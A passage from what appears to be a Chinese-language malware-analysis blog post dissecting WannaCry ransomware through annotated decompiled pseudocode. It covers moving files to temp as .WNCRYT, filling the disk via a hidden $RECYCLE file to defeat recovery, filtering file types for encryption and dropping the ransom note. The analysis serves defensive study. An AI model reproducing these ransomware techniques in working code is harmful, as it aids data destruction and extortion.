<span class="token function">sub_10005680</span><span class="token punctuation">(</span>LPVOID Num_3<span class="token punctuation">)</span>  <span class="token punctuation">&#123;</span>  <span class="token keyword">char</span> Parameter<span class="token punctuation">;</span> <span class="token comment">// [esp+0h] [ebp-930h]  </span><span class="token keyword">int</span> v3<span class="token punctuation">;</span> <span class="token comment">// [esp+92Ch] [ebp-4h]  </span><span class="token function">InitCritical</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>Parameter<span class="token punctuation">)</span><span class="token punctuation">;</span>                     <span class="token comment">// 初始化临界区  </span>v3 <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>  <span class="token keyword">if</span> <span class="token punctuation">(</span> <span class="token function">MovFileToTemp</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>Parameter<span class="token punctuation">,</span> FileName<span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token keyword">int</span><span class="token punctuation">)</span>sub_10005340<span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token keyword">int</span><span class="token punctuation">)</span><span class="token operator">&amp;</span>dword_1000DD8C<span class="token punctuation">)</span> <span class="token punctuation">)</span><span class="token comment">// 移动文件到临时目录下并重命名为.WNCRTY  </span><span class="token punctuation">&#123;</span>  <span class="token function">EncryptFile</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token keyword">int</span><span class="token punctuation">)</span><span class="token operator">&amp;</span>Parameter<span class="token punctuation">,</span> <span class="token punctuation">(</span>LONG<span class="token punctuation">)</span>Num_3<span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">// 加密磁盘上的所有文件   </span><span class="token function">FillDisk</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token keyword">int</span><span class="token punctuation">)</span>Num_3<span class="token punctuation">)</span><span class="token punctuation">;</span>                       <span class="token comment">// 在回收站创建一个文件 并且循环写入数据直到磁盘空间不足  </span><span class="token function">ReleaseResouce</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>Parameter<span class="token punctuation">)</span><span class="token punctuation">;</span>                 <span class="token comment">// 释放资源  </span><span class="token function">ExitThread</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token punctuation">&#125;</span>  v3 <span class="token operator">=</span> <span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">;</span>  <span class="token function">DeleteCritical</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>Parameter<span class="token punctuation">)</span><span class="token punctuation">;</span>                   <span class="token comment">// 释放临界区  </span><span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span>  <span class="token punctuation">&#125;</span>  <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><blockquote><p>第二层中有三个比较重要的函数，起到了防止恢复软件对删除文件进行恢复等作用</p></blockquote><h4 id="6-2-2-1-MoveFileToTemp-移动文件并重命名"><a href="#6-2-2-1-MoveFileToTemp-移动文件并重命名" class="headerlink" title="6.2.2.1 MoveFileToTemp 移动文件并重命名"></a>6.2.2.1 MoveFileToTemp 移动文件并重命名</h4><pre class="line-numbers language-c" data-language="c"><code class="language-c">result <span class="token operator">=</span> <span class="token punctuation">(</span>HGLOBAL<span class="token punctuation">)</span><span class="token function">CreatePkyAndEky</span><span class="token punctuation">(</span><span class="token punctuation">(</span>_DWORD <span class="token operator">*</span><span class="token punctuation">)</span>lpParameter <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">,</span> lpFileName<span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">// 创建00000000.pky和00000000.eky文件 此时文件已存在 直接退出函数  </span><span class="token keyword">if</span> <span class="token punctuation">(</span> result <span class="token punctuation">)</span>  <span class="token punctuation">&#123;</span>  <span class="token keyword">if</span> <span class="token punctuation">(</span> lpFileName <span class="token punctuation">)</span>                           <span class="token comment">// lpFileName=00000000.pky  </span><span class="token function">CreatePkyAndEky</span><span class="token punctuation">(</span><span class="token punctuation">(</span>_DWORD <span class="token operator">*</span><span class="token punctuation">)</span>v4 <span class="token operator">+</span> <span class="token number">11</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">// 再一次检测是否存在这两个文件  </span>result <span class="token operator">=</span> <span class="token function">GlobalAlloc</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0x100000u</span><span class="token punctuation">)</span><span class="token punctuation">;</span>         <span class="token comment">// 申请0x10000大小的空间  </span><span class="token operator">*</span><span class="token punctuation">(</span><span class="token punctuation">(</span>_DWORD <span class="token operator">*</span><span class="token punctuation">)</span>v4 <span class="token operator">+</span> <span class="token number">0x132</span><span class="token punctuation">)</span> <span class="token operator">=</span> result<span class="token punctuation">;</span>  <span class="token keyword">if</span> <span class="token punctuation">(</span> result <span class="token punctuation">)</span>  <span class="token punctuation">&#123;</span>  result <span class="token operator">=</span> <span class="token function">GlobalAlloc</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0x100000u</span><span class="token punctuation">)</span><span class="token punctuation">;</span>       <span class="token comment">// 再次申请0x10000大小的空间  </span><span class="token operator">*</span><span class="token punctuation">(</span><span class="token punctuation">(</span>_DWORD <span class="token operator">*</span><span class="token punctuation">)</span>v4 <span class="token operator">+</span> <span class="token number">0x133</span><span class="token punctuation">)</span> <span class="token operator">=</span> result<span class="token punctuation">;</span>  <span class="token keyword">if</span> <span class="token punctuation">(</span> result <span class="token punctuation">)</span>  <span class="token punctuation">&#123;</span>  <span class="token function">InitializeCriticalSection</span><span class="token punctuation">(</span><span class="token punctuation">(</span>LPCRITICAL_SECTION<span class="token punctuation">)</span><span class="token punctuation">(</span>v4 <span class="token operator">+</span> <span class="token number">1260</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token operator">*</span><span class="token punctuation">(</span><span class="token punctuation">(</span>_DWORD <span class="token operator">*</span><span class="token punctuation">)</span>v4 <span class="token operator">+</span> <span class="token number">310</span><span class="token punctuation">)</span> <span class="token operator">=</span> <span class="token function">CreateThread</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token punctuation">(</span>LPTHREAD_START_ROUTINE<span class="token punctuation">)</span>StartAddress<span class="token punctuation">,</span> v4<span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">// 将文件移动到临时目录下并重命名为WNCRTY  </span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>该函数单独创建了一个线程 将一部分文本文件移动到临时目录并重命名</p><p>值得注意的是，这时文件并没有进行加密，是可以直接通过修改后缀名修复的</p><h4 id="6-2-2-2-FillDisk-回收站循环写入"><a href="#6-2-2-2-FillDisk-回收站循环写入" class="headerlink" title="6.2.2.2 FillDisk 回收站循环写入"></a>6.2.2.2 FillDisk 回收站循环写入</h4><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token keyword">void</span> <span class="token operator">*</span>__cdecl <span class="token function">FillDisk</span><span class="token punctuation">(</span><span class="token keyword">int</span> Num_3<span class="token punctuation">)</span>  <span class="token punctuation">&#123;</span>  hGlobal <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token keyword">void</span> <span class="token operator">*</span><span class="token punctuation">)</span><span class="token function">GetDriveTypeW</span><span class="token punctuation">(</span>RootPathName<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">// 获取磁盘类型  </span><span class="token keyword">if</span> <span class="token punctuation">(</span> hGlobal <span class="token operator">==</span> <span class="token punctuation">(</span><span class="token keyword">void</span> <span class="token operator">*</span><span class="token punctuation">)</span>DRIVE_FIXED <span class="token punctuation">)</span>         <span class="token comment">// 如果是固定磁盘  </span><span class="token punctuation">&#123;</span>  hGlobal <span class="token operator">=</span> <span class="token function">GlobalAlloc</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0xA00000u</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token comment">// 申请0xA00000大小的固定空间  </span>hGlobal_1 <span class="token operator">=</span> hGlobal<span class="token punctuation">;</span>  <span class="token keyword">if</span> <span class="token punctuation">(</span> hGlobal <span class="token punctuation">)</span>  <span class="token punctuation">&#123;</span>  <span class="token function">memset</span><span class="token punctuation">(</span>hGlobal<span class="token punctuation">,</span> <span class="token number">0x55u</span><span class="token punctuation">,</span> <span class="token number">0xA00000u</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token comment">// 将申请的空间全部初始化为5  </span>FileName <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>  <span class="token function">memset</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>v12<span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0x204u</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  v13 <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>  <span class="token function">DeleteRecycleFile</span><span class="token punctuation">(</span>Num_3<span class="token punctuation">,</span> <span class="token operator">&amp;</span>FileName<span class="token punctuation">)</span><span class="token punctuation">;</span>      <span class="token comment">// 删除$RECYCLE的hibsys.WNCRYT文件  </span>hFile <span class="token operator">=</span> <span class="token function">CreateFileW</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>FileName<span class="token punctuation">,</span> GENERIC_WRITE<span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> CREATE_ALWAYS<span class="token punctuation">,</span> FILE_ATTRIBUTE_HIDDEN<span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">// 在$RECYCLE下创建一个hibsys.WNCRYT 属性为隐藏  </span><span class="token keyword">if</span> <span class="token punctuation">(</span> hFile <span class="token operator">==</span> <span class="token punctuation">(</span>HANDLE<span class="token punctuation">)</span><span class="token operator">-</span><span class="token number">1</span> <span class="token punctuation">)</span>  <span class="token punctuation">&#123;</span>  hGlobal <span class="token operator">=</span> <span class="token function">GlobalFree</span><span class="token punctuation">(</span>hGlobal_1<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token comment">// 创建失败直接释放空间  </span><span class="token punctuation">&#125;</span>  <span class="token keyword">else</span>  <span class="token punctuation">&#123;</span>  <span class="token function">MoveFileExW</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>FileName<span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> MOVEFILE_DELAY_UNTIL_REBOOT<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">// 在系统下次重新启动时正式进行移动文件操作  </span><span class="token keyword">if</span> <span class="token punctuation">(</span> <span class="token operator">!</span>dword_1000DD8C <span class="token punctuation">)</span>  <span class="token punctuation">&#123;</span>  LABEL_6<span class="token operator">:</span>  <span class="token keyword">if</span> <span class="token punctuation">(</span> <span class="token function">GetDiskFreeSpaceExW</span><span class="token punctuation">(</span>             <span class="token comment">// 获取D盘的剩余空间的大小 确保空间足够  </span>RootPathName<span class="token punctuation">,</span>  <span class="token operator">&amp;</span>FreeBytesAvailableToCaller<span class="token punctuation">,</span>  <span class="token operator">&amp;</span>TotalNumberOfBytes<span class="token punctuation">,</span>  <span class="token operator">&amp;</span>TotalNumberOfFreeBytes<span class="token punctuation">)</span>  <span class="token operator">&amp;&amp;</span> TotalNumberOfFreeBytes<span class="token punctuation">.</span>QuadPart <span class="token operator">></span> <span class="token number">0x40000000</span> <span class="token punctuation">)</span>  <span class="token punctuation">&#123;</span>  index <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>  <span class="token keyword">while</span> <span class="token punctuation">(</span> <span class="token function">WriteFile</span><span class="token punctuation">(</span>hFile<span class="token punctuation">,</span> hGlobal_1<span class="token punctuation">,</span> <span class="token number">0xA00000u</span><span class="token punctuation">,</span> <span class="token operator">&amp;</span>NumberOfBytesWritten<span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span> <span class="token punctuation">)</span><span class="token comment">// 将0xA00000个字节的5写入到hibsys.WNCRYT  </span><span class="token punctuation">&#123;</span>  <span class="token function">Sleep</span><span class="token punctuation">(</span><span class="token number">0xAu</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token keyword">if</span> <span class="token punctuation">(</span> <span class="token punctuation">(</span><span class="token keyword">unsigned</span> <span class="token keyword">int</span><span class="token punctuation">)</span><span class="token operator">++</span>index <span class="token operator">>=</span> <span class="token number">20</span> <span class="token punctuation">)</span><span class="token comment">// 循环写入20次  </span><span class="token punctuation">&#123;</span>  <span class="token function">Sleep</span><span class="token punctuation">(</span><span class="token number">10000u</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token keyword">if</span> <span class="token punctuation">(</span> <span class="token operator">!</span>dword_1000DD8C <span class="token punctuation">)</span>  <span class="token keyword">goto</span> LABEL_6<span class="token punctuation">;</span>                 <span class="token comment">// 当磁盘剩余空间不足时跳出循环  </span><span class="token keyword">break</span><span class="token punctuation">;</span>  <span class="token punctuation">&#125;</span>  <span class="token punctuation">&#125;</span>  <span class="token punctuation">&#125;</span>  <span class="token punctuation">&#125;</span>  <span class="token function">GlobalFree</span><span class="token punctuation">(</span>hGlobal_1<span class="token punctuation">)</span><span class="token punctuation">;</span>                  <span class="token comment">// 释放申请的内存  </span><span class="token function">FlushFileBuffers</span><span class="token punctuation">(</span>hFile<span class="token punctuation">)</span><span class="token punctuation">;</span>                <span class="token comment">// 刷新文件缓冲区  </span><span class="token function">CloseHandle</span><span class="token punctuation">(</span>hFile<span class="token punctuation">)</span><span class="token punctuation">;</span>  hGlobal <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token keyword">void</span> <span class="token operator">*</span><span class="token punctuation">)</span><span class="token function">DeleteFileW</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>FileName<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">// 删除临时目录文件夹下的hibsys.WNCRYT  </span><span class="token punctuation">&#125;</span>  <span class="token punctuation">&#125;</span>  <span class="token punctuation">&#125;</span>  <span class="token keyword">return</span> hGlobal<span class="token punctuation">;</span>  <span class="token punctuation">&#125;</span> <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>这个函数 会在 $RECYCLE 下创建一个名为 hibsys.WNCRYT 的文件<br>并设置属性为隐藏，并循环往这个文件写入数据，知道磁盘空间不足</p><p>在我们的测试环境下，这个文件已经达到了 39个G</p><img src="/2020/12/30/Wannacry%20%E7%97%85%E6%AF%92%E5%88%86%E6%9E%90/image19.png" class="" width="19"><h4 id="6-2-2-3-EncryptFile-加密磁盘上的所有文件"><a href="#6-2-2-3-EncryptFile-加密磁盘上的所有文件" class="headerlink" title="6.2.2.3 EncryptFile 加密磁盘上的所有文件"></a>6.2.2.3 EncryptFile 加密磁盘上的所有文件</h4><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token keyword">if</span> <span class="token punctuation">(</span> a3 <span class="token punctuation">)</span>                                     <span class="token comment">// 条件不成立  </span><span class="token punctuation">&#123;</span>  uDriveType <span class="token operator">=</span> GetDriveTypeW<span class="token punctuation">;</span>                 <span class="token comment">// 获取磁盘类型  </span><span class="token keyword">if</span> <span class="token punctuation">(</span> <span class="token function">GetDriveTypeW</span><span class="token punctuation">(</span>DirectoryName<span class="token punctuation">)</span> <span class="token operator">==</span> DRIVE_CDROM <span class="token punctuation">)</span><span class="token comment">// 如果是CD驱动器直接返回  </span><span class="token keyword">return</span><span class="token punctuation">;</span>  <span class="token function">InterlockedExchange</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>Target<span class="token punctuation">,</span> Value<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token comment">// 交换两个数  </span><span class="token keyword">goto</span> LABEL_12<span class="token punctuation">;</span>  <span class="token punctuation">&#125;</span>  <span class="token keyword">if</span> <span class="token punctuation">(</span> <span class="token function">InterlockedExchangeAdd</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>Target<span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span> <span class="token operator">!=</span> Value <span class="token punctuation">)</span><span class="token comment">// 用于对一个32位数值执行加法的原子操作  </span><span class="token punctuation">&#123;</span>  v3 <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>  <span class="token keyword">while</span> <span class="token punctuation">(</span> <span class="token operator">!</span><span class="token function">GetDiskFreeSpaceExW</span><span class="token punctuation">(</span>               <span class="token comment">// 获取D盘的空余容量 如果失败直接返回  </span>DirectoryName<span class="token punctuation">,</span>  <span class="token operator">&amp;</span>FreeBytesAvailableToCaller<span class="token punctuation">,</span>  <span class="token operator">&amp;</span>TotalNumberOfBytes<span class="token punctuation">,</span>  <span class="token operator">&amp;</span>TotalNumberOfFreeBytes<span class="token punctuation">)</span>  <span class="token operator">||</span> <span class="token operator">!</span>TotalNumberOfBytes<span class="token punctuation">.</span>QuadPart <span class="token punctuation">)</span>  <span class="token punctuation">&#123;</span>  <span class="token function">Sleep</span><span class="token punctuation">(</span><span class="token number">1000u</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token keyword">if</span> <span class="token punctuation">(</span> <span class="token operator">++</span>v3 <span class="token operator">>=</span> <span class="token number">30</span> <span class="token punctuation">)</span>  <span class="token keyword">return</span><span class="token punctuation">;</span>  <span class="token punctuation">&#125;</span>  uDriveType <span class="token operator">=</span> GetDriveTypeW<span class="token punctuation">;</span>  <span class="token keyword">if</span> <span class="token punctuation">(</span> <span class="token function">GetDriveTypeW</span><span class="token punctuation">(</span>DirectoryName<span class="token punctuation">)</span> <span class="token operator">!=</span> DRIVE_CDROM <span class="token punctuation">)</span><span class="token comment">// 获取磁盘类型  </span><span class="token punctuation">&#123;</span>  LABEL_12<span class="token operator">:</span>  <span class="token keyword">if</span> <span class="token punctuation">(</span> <span class="token function">uDriveType</span><span class="token punctuation">(</span>DirectoryName<span class="token punctuation">)</span> <span class="token operator">==</span> DRIVE_FIXED <span class="token punctuation">)</span><span class="token comment">// 如果磁盘类型是固定磁盘  </span><span class="token punctuation">&#123;</span>  lpPath <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>  <span class="token function">memset</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>v11<span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0x204u</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  v12 <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>  <span class="token function">GetRecyclePathOrTempPath</span><span class="token punctuation">(</span>Value<span class="token punctuation">,</span> <span class="token operator">&amp;</span>lpPath<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">// 获取C盘下临时文件和回收站路径  </span><span class="token function">GetFilePath</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token class-name">wchar_t</span> <span class="token operator">*</span><span class="token punctuation">)</span>Path<span class="token punctuation">,</span> <span class="token operator">&amp;</span>lpPath<span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token comment">//获取文件路径D:$RECYCLE0.WNCRYT  </span><span class="token punctuation">&#125;</span>  <span class="token function">LOWORD</span><span class="token punctuation">(</span>v6<span class="token punctuation">)</span> <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>  <span class="token function">CoreEncryptFun</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token keyword">const</span> <span class="token class-name">wchar_t</span> <span class="token operator">*</span><span class="token punctuation">)</span>Path<span class="token punctuation">,</span> DirectoryName<span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">// 核心函数 加密操作  </span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>该函数主体仍是加密文件之前的预处理部分，涉及具体的加密过程要进入<br>CoreEncryptFun 函数进行分析。</p><h3 id="6-2-3-第三层"><a href="#6-2-3-第三层" class="headerlink" title="6.2.3 第三层"></a>6.2.3 第三层</h3><p>TraverseAndEncryptFiles(v3, DirectoryName, (int)&amp;v15, -1, a3);// 遍历所有文件 并且加密 </p><p>第三层主要就是递归调用这个加密函数并对所有要加密文件进行遍历，下面我们继续深入</p><h3 id="6-2-4-第四层"><a href="#6-2-4-第四层" class="headerlink" title="6.2.4 第四层"></a>6.2.4 第四层</h3><pre class="line-numbers language-c" data-language="c"><code class="language-c">FileKind <span class="token operator">=</span> <span class="token function">FilterPostFix</span><span class="token punctuation">(</span>FindFileData<span class="token punctuation">.</span>cFileName<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">// 对后缀进行过滤 返回值为1说明是exe或dll 2说明是文本文件或者图片  </span>v48 <span class="token operator">=</span> FileKind<span class="token punctuation">;</span>  <span class="token keyword">if</span> <span class="token punctuation">(</span> FileKind <span class="token operator">!=</span> <span class="token punctuation">(</span><span class="token class-name">wchar_t</span> <span class="token operator">*</span><span class="token punctuation">)</span><span class="token number">6</span>   <span class="token comment">// 如果后缀为.WNCRY直接跳过  </span><span class="token operator">&amp;&amp;</span> FileKind <span class="token operator">!=</span> <span class="token punctuation">(</span><span class="token class-name">wchar_t</span> <span class="token operator">*</span><span class="token punctuation">)</span><span class="token number">1</span>   <span class="token comment">// 如果是exe和dll直接跳过遍历下一个文件  </span><span class="token operator">&amp;&amp;</span> <span class="token punctuation">(</span>FileKind <span class="token operator">||</span> FindFileData<span class="token punctuation">.</span>nFileSizeHigh <span class="token operator">></span> <span class="token number">0</span> <span class="token operator">||</span> FindFileData<span class="token punctuation">.</span>nFileSizeLow <span class="token operator">>=</span> <span class="token number">0xC800000</span><span class="token punctuation">)</span> <span class="token punctuation">)</span>  <span class="token punctuation">&#123;</span>  <span class="token function">wcsncpy</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>TaegetFileName<span class="token punctuation">,</span> FindFileData<span class="token punctuation">.</span>cFileName<span class="token punctuation">,</span> <span class="token number">0x103u</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">// 将文件名拷贝到目标内存  </span><span class="token function">wcsncpy</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>TargetFileFullPath<span class="token punctuation">,</span> <span class="token operator">&amp;</span>String<span class="token punctuation">,</span> <span class="token number">0x167u</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">// 将完整路径拷贝到目标内存  </span>dwFileSizeHigh <span class="token operator">=</span> FindFileData<span class="token punctuation">.</span>nFileSizeHigh<span class="token punctuation">;</span>  dwFileSizeLow <span class="token operator">=</span> FindFileData<span class="token punctuation">.</span>nFileSizeLow<span class="token punctuation">;</span>  <span class="token function">sub_10003760</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>v32<span class="token punctuation">,</span> <span class="token operator">&amp;</span>v36<span class="token punctuation">,</span> v33<span class="token punctuation">,</span> <span class="token operator">&amp;</span>TargetFileFullPath<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">// 这个函数会操作容器将容器的计数+1  </span><span class="token punctuation">&#125;</span>  <span class="token punctuation">&#125;</span>  <span class="token punctuation">&#125;</span>  <span class="token punctuation">&#125;</span>  <span class="token punctuation">&#125;</span>  <span class="token punctuation">&#125;</span>  hFile <span class="token operator">=</span> hFindFile<span class="token punctuation">;</span>  <span class="token punctuation">&#125;</span>  <span class="token keyword">while</span> <span class="token punctuation">(</span> <span class="token function">FindNextFileW</span><span class="token punctuation">(</span>hFindFile<span class="token punctuation">,</span> <span class="token operator">&amp;</span>FindFileData<span class="token punctuation">)</span> <span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">// 查找下一个文件  </span><span class="token function">FindClose</span><span class="token punctuation">(</span>hFile<span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token keyword">for</span> <span class="token punctuation">(</span> i <span class="token operator">=</span> <span class="token operator">*</span><span class="token punctuation">(</span><span class="token class-name">wchar_t</span> <span class="token punctuation">)</span>v33<span class="token punctuation">;</span> i <span class="token operator">!=</span> v33<span class="token punctuation">;</span> i <span class="token operator">=</span> <span class="token operator">*</span><span class="token punctuation">(</span><span class="token class-name">wchar_t</span> <span class="token punctuation">)</span>i <span class="token punctuation">)</span><span class="token comment">// 循环加密所有的文件  </span><span class="token punctuation">&#123;</span>  <span class="token keyword">if</span> <span class="token punctuation">(</span> <span class="token operator">!</span><span class="token function">EncryptAllFile</span><span class="token punctuation">(</span>v5<span class="token punctuation">,</span> i <span class="token operator">+</span> <span class="token number">4</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">)</span> <span class="token punctuation">)</span>      <span class="token comment">// 加密所有文件  </span><span class="token function">sub_10003760</span><span class="token punctuation">(</span><span class="token punctuation">(</span>_DWORD <span class="token operator">*</span><span class="token punctuation">)</span>a3<span class="token punctuation">,</span> <span class="token operator">&amp;</span>v36<span class="token punctuation">,</span> <span class="token operator">*</span><span class="token punctuation">(</span>_DWORD <span class="token punctuation">)</span><span class="token punctuation">(</span>a3 <span class="token operator">+</span> <span class="token number">4</span><span class="token punctuation">)</span><span class="token punctuation">,</span> i <span class="token operator">+</span> <span class="token number">4</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token punctuation">&#125;</span>  v14 <span class="token operator">=</span> a4<span class="token punctuation">;</span>  <span class="token keyword">if</span> <span class="token punctuation">(</span> a4 <span class="token operator">==</span> <span class="token operator">-</span><span class="token number">1</span> <span class="token punctuation">)</span>  <span class="token punctuation">&#123;</span>  v15 <span class="token operator">=</span> Format<span class="token punctuation">;</span>  v14 <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>  <span class="token keyword">if</span> <span class="token punctuation">(</span> <span class="token function">wcsnicmp</span><span class="token punctuation">(</span>Format<span class="token punctuation">,</span> asc_1000CC14<span class="token punctuation">,</span> <span class="token number">2u</span><span class="token punctuation">)</span> <span class="token punctuation">)</span>  v14 <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">;</span>  <span class="token keyword">else</span>  v15 <span class="token operator">=</span> Format <span class="token operator">+</span> <span class="token number">2</span><span class="token punctuation">;</span>  v16 <span class="token operator">=</span> <span class="token operator">*</span>v15<span class="token punctuation">;</span>  <span class="token keyword">for</span> <span class="token punctuation">(</span> j <span class="token operator">=</span> v15<span class="token punctuation">;</span> v16<span class="token punctuation">;</span> <span class="token operator">++</span>j <span class="token punctuation">)</span>  <span class="token punctuation">&#123;</span>  <span class="token keyword">if</span> <span class="token punctuation">(</span> v16 <span class="token operator">==</span> <span class="token number">92</span> <span class="token punctuation">)</span>  <span class="token operator">++</span>v14<span class="token punctuation">;</span>  v16 <span class="token operator">=</span> j<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">;</span>  <span class="token punctuation">&#125;</span>  <span class="token punctuation">&#125;</span>  <span class="token keyword">if</span> <span class="token punctuation">(</span> v14 <span class="token operator">&lt;=</span> <span class="token number">6</span> <span class="token operator">&amp;&amp;</span> v34 <span class="token operator">></span> <span class="token number">0</span> <span class="token punctuation">)</span>  <span class="token punctuation">&#123;</span>  <span class="token function">CopyReadMeTxt</span><span class="token punctuation">(</span>Format<span class="token punctuation">)</span><span class="token punctuation">;</span>                    <span class="token comment">// 将@Please_Read_Me@.txt 拷贝到D盘下  </span><span class="token keyword">if</span> <span class="token punctuation">(</span> v14 <span class="token operator">></span> <span class="token number">4</span> <span class="token punctuation">)</span>  <span class="token function">CopyWanaDecryptor_0</span><span class="token punctuation">(</span>Format<span class="token 